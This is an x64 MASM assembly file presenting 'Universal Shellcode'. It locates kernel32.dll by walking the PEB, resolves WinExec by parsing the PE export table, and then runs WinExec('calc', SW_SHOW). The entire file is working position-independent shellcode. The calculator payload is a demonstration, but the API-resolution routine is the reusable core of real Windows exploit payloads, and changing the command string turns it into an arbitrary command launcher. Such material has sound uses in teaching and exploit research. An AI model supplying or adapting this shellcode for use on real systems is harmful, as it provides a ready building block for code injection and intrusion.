.code
	;
	; Universal SHELLCODE
	;
	; This Universal Shellcode parse TEB and the export table in PE file 
	; to calculate WinExec's address
	; At last, this shellcode run `WinExec("calc", SW_SHOW)`
	; 
	;
	; rbp-20h <- string 'calc'
	;
	; rax <- general purpose / Ordinal
	; rbx <- kernel32.dll base address / Function 'WinExec' Address
	; rcx <- export table address / AddressOfFunctions
	; rdx <- AddressOfNames
	; rdi <- AddressOfNameOrdinals
	; rsi <- Function Name
	; r8  <- String 'WinExec\x00'
	; r9  <- Function Address Offset
	;
	UNIVERSAL_SHELLCODE proc
	; function prolog
		push rbp
		mov rbp, rsp
		sub rsp, 20h

	; initialize
		xor rax, rax
		xor rbx, rbx
		xor rcx, rcx
		xor rdx, rdx
		xor rdi, rdi


	; get kernel32.dll base address
		xor rax, rax
		mov rax, gs : [rax+60h]		; get PEB address
		mov rax, [rax+18h]			; _PEB_LDR_DATA offset
		mov rax, [rax+20h]			; .exe InMemoryOrderModuleList
		mov rax, [rax]				; ntdll.dll InMemoryOrderModuleList
		mov rax, [rax]				; kernel32.dll InMemoryOrderModuleList
		mov rbx, [rax+20h]			; -0x10 + 0x30 / get dll base

	; get export table
		mov ecx, [rbx+3ch]			; get _IMAGE_NT_HEADERS64 start Offset
		add rcx, rbx				; get _IMAGE_NT_HEADERS64 start address
		mov ecx, [rcx+88h]			; 0x18(Optional Header Offset) + 0x70(Data Directory) + 0x0(Export Table index) / get  _IMAGE_EXPORT_DIRECTORY start Offset
		add rcx, rbx				; get _IMAGE_EXPORT_DIRECTORY start address
		
		mov edx, [rcx+20h]			; 0x20 get AddressOfNames Offset
		add rdx, rbx				; get AddressOfNames address
		mov edi, [rcx+24h]			; 0x20 get AddressOfNameOrdinals Offset
		add rdi, rbx				; get AddressOfNameOrdinals address
		mov ecx, [rcx+1ch]			; 0x20 get AddressOfFunctions Offset
		add rcx, rbx				; get AddressOfFunctions address

	; get function address
	
		xor rax, rax				; rax is index
		mov r8, 636578456e6957h		; 'WinExec\x00'
		
		not_found :

		xor rsi, rsi				; rsi is Name Pointer Table Entry
		mov esi, [rdx+4*rax]		; get Name Pointer Table Entry offset		
		add rsi, rbx				; Function Name String address
		mov rsi, [rsi]				; String Value (8 bytes)
		cmp r8, rsi					; compare 'WinExec'
		je found
		inc rax						; index++
		jmp not_found
		
		found :

		; rax is index
		xor r8, r8
		xor r9, r9
		mov r8w, [rdi+2*rax]		; get ordinal by index
		mov r9d, [rcx+4*r8]			; get function offset by ordinal
		add rbx, r9					; get function address

	; call WinExec("calc", SW_SHOW)
		mov byte ptr[rbp-20h],63h	; 'c'
		mov byte ptr[rbp-1fh],61h	; 'a'
		mov byte ptr[rbp-1eh],6ch	; 'l'
		mov byte ptr[rbp-1dh],63h	; 'c'
		mov byte ptr[rbp-1ch],0h
		mov rdx, 5h					; parameter 2
		lea rcx, [rbp-20h]			; parameter 1
		call rbx					; call WinExec()

	; function epilogue
		mov rsp, rbp		
		pop rbp
		ret
	UNIVERSAL_SHELLCODE endp
end
